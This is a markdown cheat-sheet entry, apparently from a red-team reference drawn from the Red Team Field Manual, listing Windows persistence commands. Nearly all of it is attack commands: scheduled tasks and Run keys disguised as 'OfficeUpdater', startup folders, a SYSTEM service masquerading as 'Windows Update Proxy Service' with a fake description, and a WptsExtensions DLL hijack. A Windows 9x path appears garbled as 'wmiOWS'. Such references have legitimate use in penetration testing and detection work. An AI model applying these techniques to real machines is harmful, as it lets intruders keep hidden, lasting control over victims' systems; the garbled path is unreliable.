---
name: Windows Persistence
category: Post-Exploitation & PrivEsc
description: Windows persistence techniques — scheduled tasks, run keys, startup dirs, services, DLL hijacking.
tags: [windows, persistence, schtasks, registry, dll-hijack, RTFM]
---

# Windows Persistence

User-level and system-level persistence techniques for Windows.

## User-level persistence

### Scheduled task

```batch
schtasks /Create /F /SC DAILY /ST 09:00 /TN OfficeUpdater /TR <FILE_PATH>
schtasks /query /tn OfficeUpdater /fo list /v
schtasks /delete /tn OfficeUpdater /f
```

### Run key

```batch
reg ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V OfficeUpdater /t REG_SZ /F /D "<FILE_PATH>"
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V OfficeUpdater
```

### Startup directories

| OS | Path |
|----|------|
| Win 10/11 (all users) | `%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` |
| Win 10/11 (specific user) | `%SystemDrive%\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Win XP (all users) | `%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup` |
| Win 9x | `%SystemDrive%\wmiOWS\Start Menu\Programs\Startup` |

### at.exe (WinXP)

```batch
at HH:MM <FILE_PATH> [ARGS]
at <TASK_ID> /delete
```

## System-level persistence

### Schtasks on boot

```batch
schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH>
schtasks /query /tn OfficeUpdater /fo list /v
schtasks /delete /tn OfficeUpdater /f
schtasks /run /tn OfficeUpdater
schtasks /create /tn OfficeUpdater /xml <FILE_PATH>.xml /f
```

### Service creation

```batch
sc create <SERVICE> binpath= "<FILE_PATH>" start= auto displayname= "Windows Update Proxy Service"
sc description <SERVICE> "This service ensures Windows Update works correctly in proxy environments"
sc qc <SERVICE>
sc query <SERVICE>
sc qdescription <SERVICE>
sc delete <SERVICE>
sc \\<IP> qc <SERVICE>
```

### DLL hijack (WptsExtensions)

```batch
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH
```

Upload `WptsExtensions.dll` to a folder in PATH, reboot — the schedule service loads it on startup.

> Source: RTFM — Red Team Field Manual v2
